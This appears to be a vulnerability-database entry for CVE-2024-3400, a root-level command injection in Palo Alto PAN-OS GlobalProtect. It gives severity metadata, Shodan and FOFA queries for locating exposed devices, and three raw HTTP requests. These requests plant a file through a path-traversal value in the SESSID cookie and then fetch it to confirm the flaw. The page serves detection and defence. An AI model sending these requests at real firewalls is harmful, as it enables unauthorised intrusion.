---
layout: post
cve_id: CVE-2024-3400
title: GlobalProtect - OS Command Injection
pcap: true
pcap_path: /pcaps/2024/CVE-2024-3400.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2024/CVE-2024-3400.yaml
snort2_rule: N/A
snort3_rule: N/A
author: salts,parthmalhotra
severity: critical
impact: 'Unauthenticated attackers can execute arbitrary code with root privileges
  on Palo Alto Networks PAN-OS firewalls.

  '
remediation: 'Apply security patches for PAN-OS addressing CVE-2024-3400.

  '
reference:
- https://labs.watchtowr.com/palo-alto-putting-the-protecc-in-globalprotect-CVE-2024-3400/
- https://attackerkb.com/topics/SSTk336Tmf/cve-2024-3400/rapid7-analysis
- https://nvd.nist.gov/vuln/detail/CVE-2024-3400
- https://github.com/zam89/CVE-2024-3400-pot
- https://github.com/ZephrFish/CVE-2024-3400-Canary
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
  cvss-score: 10
  cve-id: CVE-2024-3400
  cwe-id: CWE-20,CWE-77
  epss-score: 0.94297
  epss-percentile: 0.99939
  cpe: cpe:2.3:o:paloaltonetworks:pan-os:10.2.0:-:*:*:*:*:*:*
metadata:
  verified: true
  max-request: 3
  vendor: paloaltonetworks
  product: pan-os
  shodan-query:
  - http.favicon.hash:-631559155
  - http.favicon.hash:"-631559155"
  - cpe:"cpe:2.3:o:paloaltonetworks:pan-os"
  fofa-query: icon_hash="-631559155"
tags:
- cve
- cve2024
- globalprotect
- pan-os
- rce
- oast
- kev
- intrusive
- paloaltonetworks
- vkev
- vuln
---

## üîç Vulnerability Description
A command injection vulnerability in the GlobalProtect feature of Palo Alto Networks PAN-OS software for specific PAN-OS versions and distinct feature configurations may enable an unauthenticated attacker to execute arbitrary code with root privileges on the firewall.Cloud NGFW, Panorama appliances, and Prisma Access are not impacted by this vulnerability.


## üåê HTTP Request
```nohighlight
GET /global-protect/portal/images/38BMF8nNmyFmshokguvDTTaob1l.txt HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:126.0) Gecko/20100101 Firefox/126.0
Connection: close
Accept-Encoding: gzip
```

```nohighlight
POST /ssl-vpn/hipreport.esp HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh, Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/19.0 Safari/605.1.15
Connection: close
Content-Length: 174
Content-Type: application/x-www-form-urlencoded
Cookie: SESSID=/../../../var/appweb/sslvpndocs/global-protect/portal/images/38BMF8nNmyFmshokguvDTTaob1l.txt;
Accept-Encoding: gzip
user=global&portal=global&authcookie=e51140e4-4ee3-4ced-9373-96160d68&domain=global&computer=global&client-ip=global&client-ipv6=global&md5-sum=global&gwHipReportCheck=global
```

```nohighlight
GET /global-protect/portal/images/38BMF8nNmyFmshokguvDTTaob1l.txt HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/608.2.11 (KHTML, like Gecko) Version/13 Safari/608.2.11
Connection: close
Accept-Encoding: gzip
```

